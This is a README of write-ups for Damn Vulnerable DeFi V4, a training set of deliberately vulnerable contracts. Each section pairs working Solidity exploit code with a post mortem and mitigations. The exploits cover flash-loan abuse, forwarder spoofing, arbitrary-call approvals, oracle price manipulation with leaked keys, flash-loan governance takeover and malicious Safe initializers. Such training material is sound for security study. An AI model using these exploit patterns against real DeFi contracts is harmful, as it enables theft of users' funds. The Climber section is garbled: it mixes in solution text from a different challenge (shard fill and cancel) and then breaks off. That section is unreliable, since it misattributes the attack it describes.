# Smart Contract Vulnerability Practices

This repository  includes challenges from Damn Vulnerable DeFi V4 plus concise solutions and remediation notes to build intuition for real-world audits.

Some tests may require your fork url, please fill in the .env.example file if you need to test any of the tests.

## Contents

- [1. Unstoppable](#1-unstoppable)
- [2. Naive Receiver](#2-naive-receiver)
- [3. Truster](#3-truster)
- [4. Side Entrance](#4-side-entrance)
- [5. The Rewarder](#5-the-rewarder)
- [6. Selfie](#6-selfie)
- [7. Compromised](#7-compromised)
- [8. Puppet](#8-puppet)
- [9. PuppetV2](#9-puppetv2)
- [10. Free Rider](#10-free-rider)
- [11. Backdoor](#11-backdoor)
- [12. Climber](#12-climber)
- [13. Wallet Mining](#13-wallet-mining)
- [14. Puppet V3](#14-puppet-v3)
- [15. ABI Smuggling](#15-abi-smuggling)
- [16. Shards](#16-shards)
- [17. Curvy Puppet](#17-curvy-puppet)
- [18. Withdrawal](#18-withdrawal)


## 1. Unstoppable

### Objective
Player must halt the vault (`UnstoppableVault.sol`) to stop it from offering any flash loans

### Contracts
- `UnstoppableVault.sol`: flash loan pool with a strict balance assertion. 
- `UnstoppableMonitor.sol`: lightweight watchdog that probes the vault's flash loan health/invariants and has the authority to pause the vault.

### Solution
- Transfer any amount of `DVT` directly to the pool address so `token.balanceOf(pool)` no longer matches the pool’s internal tracked amount. The next `flashLoan` call reverts on its invariant assertion, making the pool “unstoppable.”
- Minimal exploit:

```solidity
token.transfer(address(vault), 1); // or any amount
```

### Post Mortem
The main problem is in `UnstoppableVault.sol::85` as it uses a simple invariant checking: 
`if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement`

This line converts the vault's `totalSupply` of shares into the equivalent amount of asset and compares that to `balanceBefore` which is a state variable within the contract that tracks the balance of the vault.

In other words, That means whenever `flashloan` is called and the balance of the Vault and the recorded balance mismatches, the vault will be paused/locked. 

This indifference can be caused simply by transferring any amount of DVT tokens into the vault as shown from the solution above. 

### Mitigation
Never use `asset.balanceOf(address(this))` for invariatn checking. Use a separate state variable to keep track of deposits (if this invariant condition checking is a must).

## 2. Naive Receiver

### Objective
Transfer all funds from Naive Receiver Pool(`NaiveReceiverPool.sol`) and Flash Loan Receiver contract (`FlashLoanReceiver.sol`) to a recovery account. 

### Contracts
- `NaiveReceiverPool.sol`: A WETH Pool that provides deposit, withdraw and flashloan functions. It initially contains 1000 WETH.
- `FlashLoanReceiver.sol`: A contract deployed by a user that could receive flashloans.
- `Multicall.sol`: A library that allows users to call multiple functions multiple times within the `NaiveReceiverPool` contract. 
- `BasicForwarder.sol`: A permissionless trusted forwarder contract of `NaiveReceiverPool` that enables meta-transactions.

### Solution
1. **Drain all funds from Flash Loan Receiver Contract:** We can use `NaiveReceiverPool.multicall` to trigger 10 flashloans on receiver and it would pay the fixed fee 10 times, effectively draining the receiver pool.
2. **Rescue all funds from Naive Receiver Pool:** We can use forwarder to call multicall and bring in the `withdraw` function call and address of deployer as data to withdraw all funds and fees from deployer account to recovery account
- Test Exploit: 
```solidity
//using NaiveReceiverPool.multicall to trigger 10 flashloans on receiver in a single tx
bytes[] memory data = new bytes[](10);
for (uint256 i = 0; i < 10; i++) {
    data[i] = abi.encodeWithSignature(
        "flashLoan(address,address,uint256,bytes)",
        address(receiver),
        address(weth),
        WETH_IN_RECEIVER,
        bytes("")
    );
}
pool.multicall(data);

//using forwarder to transfer all WETH from pool to recovery account by using deployer as msg.data
//_msgSender() in NaiveReceiverPool will read deployer as the msg.sender
bytes [] memory withdrawData = new bytes[](1);
withdrawData[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
    bytes32(uint256(uint160(deployer))));

BasicForwarder.Request memory request = BasicForwarder.Request({
    from: player,
    target: address(pool),
    value: 0,
    gas: gasleft(),
    nonce: forwarder.nonces(player),
    data: abi.encodeCall(pool.multicall, (withdrawData)),
    deadline: block.timestamp + 1 hours
}); 

bytes32 requestHash = keccak256(abi.encodePacked(
    "\x19\x01",
    forwarder.domainSeparator(),
    forwarder.getDataHash(request)
    )
);

(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
bytes memory signature = abi.encodePacked(r, s, v);

forwarder.execute(request, signature);
```
- On second thought, we could have combined both transaction together and execute as one. But while I was doing the exercise, I was too fixated on it being two different transaction and neglected the fact that both transaction calls multicall. A more efficient approach can be found here: https://github.com/0xSynthrax/damn-vulnerable-defi-solutions/blob/main/test/naive-receiver/NaiveReceiver.t.sol

### Post Mortem
1. The `FlashLoanReceiver` can be drained because it does not authenticate the original caller. Anyone can invoke `flashLoan` and set the receiver to the victim contract, repeatedly incurring the fixed fee until its balance is drained.
2. The pool allows unauthorized withdrawals due to how `_msgSender()` is implemented in combination with a trusted forwarder.
    ```solidity
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
    ```
    When `msg.sender` equals `trustedForwarder` and `msg.data.length >= 20`, the function returns the last 20 bytes of `msg.data` as the caller address. There is no verification that the actual initiator of the transaction matches that address, enabling arbitrary users to withdraw on behalf of any depositor with an open balance.

### Mitigation
Both issues arise from relying on unvalidated caller information in contexts where `msg.sender` is not a reliable end-user identity (callbacks and relayed/meta-transactions). Recommended mitigations:

- Require an explicit, authenticated original-caller for callbacks. For example, pass `initialCaller` into `onFlashLoan()` and validate it (e.g., `require(initialCaller == owner)` or match against a stored trusted address/role).
- For meta-transactions, adopt an EIP-2771–style pattern: verify signatures over a domain-separated struct that includes `from`, `target`, `data`, `nonce`, and `deadline`. Treat `from` as the effective sender only when the signature is valid and the forwarder is trusted.

## 3. Truster
### Objective
Rescue all funds from a Truster Lender Pool (`TrusterLenderPool.sol`) and transfer it to the recovery account
### Contracts
- `TrusterLenderPool.sol`: A contract that holds 1 Million DVT tokens and provides flashloan service.
### Solution
Deploy a minimal helper contract that calls `TrusterLenderPool.flashLoan(...)` while supplying calldata that encodes an ERC-20 `approve(attacker, amount)` against the DVT token. Because the pool performs an arbitrary low-level call via `Address.functionCall(target, data)`, it executes the approval in its own context, thereby granting the attacker an allowance over the pool’s tokens. With the allowance set, call `transferFrom` to move all funds to the recovery account.
```solidity
contract Recover {

    DamnValuableToken public immutable token;
    address public immutable pool;

    constructor(address tokenAddress, address poolAddress) {
        token = DamnValuableToken(tokenAddress);
        pool = poolAddress;
    }

    function recoverTokens(address recoveryAddress) external {
        uint256 amount = token.balanceOf(pool);
        //since the pool uses address.functionCall, we can craft any call we want
        //we can force it to call approve on the token contract, approving us to spend the pool's tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        
        TrusterLenderPool(pool).flashLoan(0, address(this), address(token), data);
        
        token.transferFrom(pool, recoveryAddress, amount);  
    }
}
```

### Post Mortem
The pool exposes a flash loan that accepts an arbitrary `target` and `data`, then executes them using OpenZeppelin’s `Address.functionCall`. The issue is not in `Address` itself (it’s a safe low-level helper) but in allowing untrusted callers to choose both the call target and calldata without any constraints.

- Library behavior:
    - `functionCall(target, data)` → requires `isContract(target)` → performs `target.call(data)` → returns or revert with reason via `verifyCallResultFromTarget`.
    - Critical lines conceptually:
        - `require(isContract(target), "Address: call to non-contract")`
        - `(bool success, bytes memory returndata) = target.call(data);`
        - `return verifyCallResultFromTarget(target, success, returndata, errorMessage);`

- The low-level call enforces only that `target` is a contract and that the call didn’t revert. It does not validate the intent of the call.
- Since the pool executes the call, `msg.sender` is the pool, so an attacker can force the contract to call any functions as the `msg.sender`. In this case, `approve`.
**Key takeaway:** `Address.functionCall` is safe as a helper, but using it to execute untrusted, arbitrary `target`/`data` supplied by external users is unsafe unless the call is tightly constrained to an expected interface and semantics.

### Mitigation
Enforce a strict receiver interface for flash loans (e.g., `IFlashLoanReceiver` or IERC-3156’s `IERC3156FlashBorrower`). The pool should only ever call the receiver’s well-defined callback (e.g., `onFlashLoan(...)`) and never accept an arbitrary `target` and `data` from the user.

## 4. Side Entrance
### Objective
Rescue all funds from the Side Entrance Lender Pool (`SideEntranceLenderPool.sol`) and transfer it to the recovery account.
### Contracts
- `SideEntranceLenderPool.sol`: A simple pool with deposit, withdraw and flash loan function with a starting balance of 1000ETH
### Solution
Deploy a contract that inherits the `IFlashLoanEtherReceiver` interface so it could be invoked the `SideEntranceLenderPool.flashLoan`. Once flashLoan is received, deposit the amount back to the `SideEntranceLenderPool` and withdraw it afterwards. 
```solidity
contract Recover is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function recover(address payable to) external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```
### Post Mortem
The main problem lies in the `flashLoan` balance checking and its undesired behaviour with the `deposit()` function. The `flashLoan` function only enforces the following balance checking:
```solidity
if (address(this).balance < balanceBefore) {
    revert RepayFailed();
}
```
This in general should not cause any problems, however, within the same contract, it allows user to perform the `deposit()` action. Therefore users can call a flashLoan, and deposit right afterwards, satisfying the `if (address(this).balance < balanceBefore)` condition while pumping up their own deposit balance. This effectively steals all funds from the contract. Therefore, all that's left for the user is to call `withdraw()`.

### Mitigation
- First recommendation would be to enforce a more robust condition checking after the flash loan, for example, on top of the balance checking, call `transferFrom()` to ensure the loan is "transferred" back to the contract instead of through any other means that may cause undesired behaviours. 
- Another strong recommendation is to enforce a **Reentrancy Guard**. OpenZeppelin has a very popular one that anyone can use. 

## 5. The Rewarder
### Objective
Rescue as much of the remaining funds in the Reward Distributor (`TheRewardDistributor.sol`) as possible and transfer it all to the designated recovery account. 
### Contracts
- `TheRewardDistributor.sol`: A contract that handles reward distribution by using merkle proof. Users can claim their share of distribution through the `claimRewards()` function 
### Solution
Create the `Claim[]` data for each valid claims for the player and repeatedly claim it in batches within one transaction to drain all funds.
```solidity
//LOGGED the address of player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C] 
//Search for their address in the dvt-distribution.json and weth-distribution.json files to find index and amounts
//Player entry is at lines 754-757 ((757-1)/4 - 1 = 188) therefore index 188
//DVT amount = 11524763827831882
//WETH amount = 1171088749244340

uint256 playerDVTAmount = 11524763827831882;
uint256 playerWETHAmount = 1171088749244340;

bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

Claim memory dvtClaim = Claim({batchNumber:0, amount:playerDVTAmount, tokenIndex:0, proof:merkle.getProof(dvtLeaves, 188)});
Claim memory wethClaim = Claim({batchNumber:0, amount:playerWETHAmount, tokenIndex:1, proof:merkle.getProof(wethLeaves, 188)});

uint256 remainingDVT = distributor.getRemaining(address(dvt));
uint256 remainingWETH = distributor.getRemaining(address(weth));

uint256 dvtClaimsLength = remainingDVT / playerDVTAmount;
uint256 wethClaimsLength = remainingWETH / playerWETHAmount;

Claim[] memory claims = new Claim[](dvtClaimsLength + wethClaimsLength);
IERC20[] memory inputTokens = new IERC20[](2);
inputTokens[0] = IERC20(address(dvt));
inputTokens[1] = IERC20(address(weth));

// file repeated claims for dvt and weth
for (uint256 i = 0; i < dvtClaimsLength + wethClaimsLength; i++){
    if (i < dvtClaimsLength){
        claims[i] = dvtClaim;
    } else {
        claims[i] = wethClaim;
    }
}

distributor.claimRewards({inputClaims:claims, inputTokens:inputTokens});
dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```

### Post Mortem
`claimRewards()` marks claims with `_setClaimed()` only when the token changes or at the final iteration. Yet it transfers on every loop interation. Repeating an identical claim array therefore passes the Merkle check each time and drains the distributor before `_setClaimed()` ever blocks the sequence.

### Mitigation
**Apply check-effects-interactions:** call `_setClaimed()` (and update remaining) for every iteration before executing any token transfer. This enforces single-use claims and prevents draining via repeated identical entries.

## 6. Selfie
### Objective
There is a lending pool (`SelfiePool.sol`) with 1.5 million DamnVulnerableVotes tokens in it and offers a Flash Loan service. It is governed by a simple governance contract (`SimpleGovernance.sol`) that uses the same tokens as votes. We need to transfer all tokens from the pool to designated recovery account. 
### Contracts
- `SelfiePool.sol`: A lending pool that provides a flash loan service.
- `SimpleGovernance.sol`: A simple governance contract that can call `emergencyExit()` function of lending pool (Uses Damn Vulnerable Votes tokens as votes)
- `ISimpleGovernance.sol`: Interface contract for Simple Governance
### Solution 
Take a flash loan of the entire token balance, self-delegate the borrowed voting power, and immediately queue an `emergencyExit(recovery)` action in `SimpleGovernance`. After the mandatory 2-day delay (`vm.warp(block.timestamp + 2 days)`), execute the queued action to drain the pool to the recovery address.
```solidity
//Recover.sol Contract I wrote
contract Recover is IERC3156FlashBorrower {
    DamnValuableVotes public immutable token;
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    address public immutable recovery;
    uint256 public actionId;

    constructor(
        address tokenAddress, 
        address poolAddress, 
        address governanceAddress,
        address recoveryAddress
    ) {
        token = DamnValuableVotes(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        recovery = recoveryAddress;
    }

    function executeQueueAction(uint256 amount) external {
        bytes memory data = "";
        token.approve(address(pool), amount);
        pool.flashLoan(this, address(token), amount, data);
    }

    function onFlashLoan(
        address initiator,
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        token.delegate(address(this));
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}

//In Selfie.t.sol
function test_selfie() public checkSolvedByPlayer {
    Recover recover = new Recover(
        address(token),
        address(pool),
        address(governance),
        recovery
    );
    recover.executeQueueAction(TOKENS_IN_POOL);
    vm.warp(block.timestamp + 2 days);
    recover.executeAction();
}
```

### Post Mortem
The exploit hinges on the governance system trusting any source of voting power at the moment of queuing. Because the pool lends all governance tokens without restricting how they are used, an attacker can momentarily control the full supply, delegate it, and enqueue arbitrary actions before the loan is repaid. The time lock does not mitigate this because voting power is only checked at queue time, not over the delay window.

### Mitigation
1. Require voting power to be measured at both queue and execution, ideally using vote snapshots over a lookback period to prevent flash-loan amplification.
2. Block governance-token flash loans (e.g., via token-level hooks or pool-level controls) or exclude borrowed balances from governance weight. 
3. Consider quorum and proposal thresholds that cannot be met with a single flash-loan position.

## 7. Compromised
### Objective
There is a DeFi Exchange (`Exchange.sol`) that is selling collectibles called “DVNFT” at 999 ETH each. At the same time, there is a data leak which compromises the Exchange, we must act fast and rescue all the funds and transfer to the designated recovery address.
### Solution 
1. Convert each leaked hex blob to ASCII to reveal two base64 strings, then base64-decode them to recover the private keys for two of the three oracle sources (`0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744` and `0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159`).
2. Use those keys to post a zero DVNFT price twice so the oracle median collapses to 0, then buy the NFT for 1 wei from the exchange.
3. With the same compromised sources, post a price equal to the exchange’s full ETH balance, approve the NFT, and sell it back to drain the exchange.
4. Restore the oracle price to 999 ETH to cover tracks and forward all recovered ETH to the designated recovery address.
```solidity
// Leaked hex-ascii fragments decode to base64 strings of two oracle-source private keys.
// Decoding yields:
//   pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
//   pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159

uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

address source1 = vm.addr(pk1);
address source2 = vm.addr(pk2);

// Push price to 1 wei using the two compromised sources (median becomes 1)
vm.startPrank(source1);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", 0);
vm.stopPrank();

// Buy NFT for almost free
vm.startPrank(player);
uint256 tokenId = exchange.buyOne{value: 1 wei}();
vm.stopPrank();

// Jack price up to the exchange's full balance to drain it on sell
vm.startPrank(source1);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();

vm.startPrank(player);
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
vm.stopPrank();

// Restore oracle price to the initial value to cover tracks
vm.startPrank(source1);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.stopPrank();

vm.startPrank(source2);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.stopPrank();

// Send proceeds to recovery
vm.prank(player);
payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
```
### Post Mortem
The oracle trusted three externally owned reporters and used a simple median without authentication beyond possession of each private key. Two leaked keys gave full control of pricing, letting the attacker swing the median to zero and then to the exchange’s entire balance. The exchange naively honored the oracle price for buy and sell without sanity bounds, caps, or time-weighting, so a single manipulated block drained all liquidity.

### Mitigation
1. Protect and rotate reporter keys; store them in HSMs, require multisig or threshold signing, and revoke/rotate on any leak suspicion.
2. Add exchange-side guards: price caps relative to reference feeds, delay between buy/sell on large moves, and suspend trading if reporter set or oracle outputs deviate beyond configured thresholds.

## 8. Puppet
### Objective
Rescue all 100,000 DVT from the lending pool (`PuppetPool.sol`) to the recovery account in a single transaction.

### Contracts
- `src/puppet/PuppetPool.sol`: Lending pool that prices collateral using the current Uniswap V1 spot reserves.
- `src/puppet/IUniswapV1Exchange.sol`: Interface contract for the UniswapV1Exchange used implicitly as an AMM for the price Oracle.

### Solution
1. Swap all 1000 DVT for ETH on Uniswap V1 to crash the on-chain price of DVT, making collateral requirements tiny.
2. Use the newly computed cheap `calculateDepositRequired` value to borrow the full pool and forward tokens to the recovery account in the same transaction.
```solidity
contract Recover {
    PuppetPool public immutable puppetPool;
    IUniswapV1Exchange public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    address public immutable recoveryAddress;
    address public immutable player;

    constructor(
        address puppetPoolAddress,
        address uniswapExchangeAddress,
        address tokenAddress,
        address recoveryAddress_,
        address player_
    ) payable {
        puppetPool = PuppetPool(puppetPoolAddress);
        uniswapExchange = IUniswapV1Exchange(uniswapExchangeAddress);
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;
        player = player_;
    }

    function recover() external {
        token.transferFrom(msg.sender, address(this), 1000e18);
        token.approve(address(uniswapExchange), 1000e18);
        uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);
        
        uint256 ethAmountRequired = puppetPool.calculateDepositRequired(100_000e18);
        puppetPool.borrow{value: ethAmountRequired}(100_000e18, recoveryAddress);
    }

    receive() external payable {}
}

function test_puppetV1() public checkSolvedByPlayer {
    Recover recover = new Recover{value: PLAYER_INITIAL_ETH_BALANCE}(
        address(lendingPool),
        address(uniswapV1Exchange),
        address(token),
        recovery,
        player
    );

    token.approve(address(recover), PLAYER_INITIAL_TOKEN_BALANCE);
    recover.recover();
}
```

### Post Mortem
The pool derives its price directly from the live Uniswap reserves in the `UniswapV1Exchange`. Since the liquidity of the pool is not deep (It only have an initial ETH and DVT balance of 10 tokens each). As a result, the price of the oracle: 
`return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);` 
can be easily manipulated. Noticing this vulnerability, any amount sufficiently large is enough to cause great price spikes or dips simply by over swapping a single token. The borrowing logic trusts that manipulated spot price without TWAP, oracle sanity checks, or minimum liquidity guards, letting an attacker collateralize a 100,000 DVT loan with only a few ETH after slippage.

### Mitigation
Use a robust oracle (e.g., TWAP, Chainlink, oracles with liquidity and time windows) instead of a single spot read from an AMM.

## 9. PuppetV2
This challenge is basically the same as Puppet. Therefore, I will only post the solution. Everything is fundamentally the same. 

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    //Swap ETH for WETH 
    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
    //Swap DVT for WETH to manipulate the price
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        0,
        path,
        address(player),
        block.timestamp * 2
    );
    //Calculate how much WETH is needed to borrow all DVT from the pool
    uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
    //Deposit WETH and borrow all DVT from the pool
    weth.approve(address(lendingPool), requiredWETH);
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
    //Transfer all DVT to recovery address
    token.transfer(recovery, token.balanceOf(player));
}
```

## 10. Free Rider
### Objective
Rescue all 6 NFTs from the NFT Market Place (`FreeRiderNFTMarketplace.sol`) and transfer them to the Recovery Contract (`FreeRiderRecoveryManager.sol`) for a Bounty of 45 ETH. But you only have a starting balance of 0.1 ETH, therefore you will need to call a flash loan to complete this challenge.

### Contracts
- `src/free-rider/FreeRiderNFTMarketplace.sol`: Marketplace that mints 6 NFTs to the deployer and lets them be offered and bought for 15 ETH each.
- `src/free-rider/FreeRiderRecoveryManager.sol`: Holds the 45 ETH bounty and releases it strictly to player as beneficiary once it has received all 6 NFTs from the beneficiary.
- `src/DamnValuableNFT.sol`: ERC721 token used by the marketplace and recovery manager.
- `UniswapV2Pair.sol`: Main contract for calling a flash loan (In this case, a flash swap)

### Solution
1. Deploy a contract that could trigger a flash swap of 15 WETH from the pair via `uniswapV2Pair.swap()` function.
2. Inside `uniswapV2Call` callback, unwrap the borrowed WETH to ETH, call `FreeRiderNFTMarketplace.buyMany()` to purchase all 6 NFTs for **ONLY** 15 ETH (one call paying for all, due to the marketplace bug), and then `safeTransferFrom` each NFT to the recovery manager with `abi.encode(player)` so it can pay out the bounty.
4. Compute the Uniswap V2 0.3% fee, wrap enough ETH back into WETH, and transfer `amountToRepay` back to the pair, leaving the player with the bounty minus the small fee.

```solidity
contract Recover is IUniswapV2Callee, IERC721Receiver {
    WETH public immutable weth;
    DamnValuableToken public immutable token;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecoveryManager public immutable recoveryManager;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable uniswapPair;
    address public immutable player;
    uint256 constant NFT_PRICE = 15 ether;

    constructor(
        address wethAddress,
        address tokenAddress,
        address marketplaceAddress,
        address recoveryManagerAddress,
        address nftAddress,
        address uniswapPairAddress,
        address playerAddress
    ) {
        weth = WETH(payable(wethAddress));
        token = DamnValuableToken(tokenAddress);
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        recoveryManager = FreeRiderRecoveryManager(recoveryManagerAddress);
        nft = DamnValuableNFT(nftAddress);
        uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        player = playerAddress;
    }

    function recover() external {
        //Need to call swap from pair for flash loan
        uniswapPair.swap(NFT_PRICE, 0, address(this), abi.encode("flashloan"));
    }

    function uniswapV2Call(
        address caller,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        //Use msg.value 15 ether to buy all NFTs from marketplace
        weth.withdraw(NFT_PRICE);
        uint256[] memory tokenIDs = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIDs[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIDs);

        //transfer NFTs to recovery manager
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
        }

        //Repay flash loan
        uint256 fee = (NFT_PRICE * 3) / 997 + 1; // UniswapV2 0.3% fee (ceil)
        uint256 amountToRepay = NFT_PRICE + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

}

function test_freeRider() public checkSolvedByPlayer {
    Recover recover = new Recover(
        address(weth),
        address(token),
        address(marketplace),
        address(recoveryManager),
        address(nft),
        address(uniswapPair),
        player
    );
    recover.recover();
}
```

### Post Mortem
`FreeRiderNFTMarketplace`’s `_buyOne` uses `msg.value` for every purchase in `buyMany` rather than tracking or decrementing per-token price. A single `buyMany{value: 15 ether}` call therefore buys all 6 NFTs even though they are individually priced at 15 ETH each. The marketplace also pays the seller using `ownerOf` *after* the transfer, so it ends up paying the buyer instead of the original owner, which makes draining the marketplace’s ETH balance even cheaper for the attacker.

### Mitigation
- In `buyMany`, consume `msg.value` per token (e.g., track remaining payment and decrement on each `_buyOne`) so that the total ETH sent must cover the sum of individual prices.
- When paying the seller, cache the seller address *before* transferring the NFT and pay that cached address.

## 11. Backdoor
### Objective
The goal is to steal the 40 DVT tokens held by the `WalletRegistry` for four registered beneficiaries (Alice, Bob, Charlie and David) and deposit them into the designated recovery account in a single transaction. The registry awards 10 DVT to a Safe wallet when that wallet is created and registered via the legitimate `SafeProxyFactory`.

### Contracts
- `WalletRegistry.sol`: A wallet registry + rewards distributor. It Tracks a list of beneficiary EOAs; when a beneficiary creates a valid Safe wallet through the trusted factory/singleton, the registry registers the wallet and transfers a fixed token reward to it.
- `SafeProxyFactory.sol`: A deterministic proxy deployer for deploying SafeProxy instances using CREATE2, with helpers to pass an initializer and optionally invoke a callback after creation.
- `Safe.sol`: Core Gnosis Safe implementation. Deployed once as a “singleton” (master copy) in the test, then every user wallet is a proxy that delegates to this singleton for logic.
- `SafeProxy.sol`: A lightweight proxy that stores a pointer to the singleton (master copy) and forwards all calls to it via delegatecall. Each beneficiary’s wallet is created as a SafeProxy, so storage (owners/threshold) is unique per wallet, but code is shared. 

### Solution
1. Craft a Safe `setup()` initializer that sets the beneficiary as owner and executes an approval for the attacker during setup.
2. For each beneficiary (Alice, Bob, Charlie, David), call `SafeProxyFactory.createProxyWithCallback(...)` with the crafted initializer and the registry as callback.
3. The registry sends 10 DVT to the new wallet; immediately call `transferFrom` to move the reward to the recovery account.
4. Run all four proxy creations and transfers within a single transaction.
```solidity
contract Recover {
    Safe public immutable singletonCopy;
    SafeProxyFactory public immutable walletFactory;
    WalletRegistry public immutable walletRegistry;
    DamnValuableToken public immutable token;
    address public immutable recoveryAddress;
    address[] public users;

    constructor(
        address singletonCopyAddress,
        address walletFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress,
        address recoveryAddress_,
        address[] memory users_
    ) {
        singletonCopy = Safe(payable(singletonCopyAddress));
        walletFactory = SafeProxyFactory(walletFactoryAddress);
        walletRegistry = WalletRegistry(walletRegistryAddress);
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;
        users = users_;
    }

    function approveMax(address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function recover() external {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                abi.encodeWithSignature("approveMax(address)", address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(address(proxy), recoveryAddress, token.balanceOf(address(proxy)));
        }
    }
}
```
### Post Mortem
- This challenge is very similar to **3. Truster**
- The registry trusts the wallet creation flow and pushes funds to a contract that runs attacker-controlled initializer code. Because Safe `setup()` can execute arbitrary calls, the wallet can pre-authorize the attacker to move tokens before the registry transfers the reward, enabling immediate `transferFrom`.

### Mitigation
- Restrict or validate initializer calldata when accepting third-party factory callbacks; enforce a two-step register-then-claim flow or a delay window for on-chain inspection.

## 12. Climber
### Objective
Exploit the timelock + UUPS vault arrangement to drain the vault’s tokens to the attacker.

### Contracts
- `ClimberVault.sol`: UUPS upgradeable vault. Owner is the `ClimberTimelock`. Exposes `withdraw`, `sweepFunds`, and uses `UUPSUpgradeable` (so owner can call `upgradeTo`/`upgradeToAndCall`).
- `ClimberTimelock.sol`: Timelock with `ADMIN_ROLE`/`PROPOSER_ROLE`, `schedule(...)` and `execute(...)`, and a configurable `delay`. Holds operations in an `operations` mapping and is the `owner` of the `ClimberVault` instance.
- `ClimberTimelockBase.sol`: Defines `Operation` struct, `operations` mapping, `delay`, and helper `getOperationId` / `getOperationState`.
- `ClimberConstants.sol` / `ClimberErrors.sol`: parameter limits and revert types used by the timelock/vault.

### Solution
- Buy small shard bundles (up to the zero-paid threshold) and immediately cancel them.
    - `fill()` charges floor(w * A0 / T) while `cancel()` refunds ceil(w * r / scale). That lets `w <= 133` be purchased for `Paid(w)=0` but refunded with a large positive amount.
    - Automate a loop in a helper contract: call `fill(offerId, w)`, then `cancel(purchaseId)` and repeat until the vault/fee pool target is reached or stock exhausted. The marketplace's incorrect time check allows fill→cancel back-to-back in one transaction.
    - For the test constants, use `w = 133` per iteration to maximize extraction per call; repeat ~7518 iterations to reach the test target.

1. Build a single batched operation (arrays of `targets`, `values`, `dataElements`, and a `salt`) containing the following calls executed by the timelock:
    - `grantRole(PROPOSER_ROLE, address(this))` on the timelock to grant proposer role for ourselves so we can call schedule.
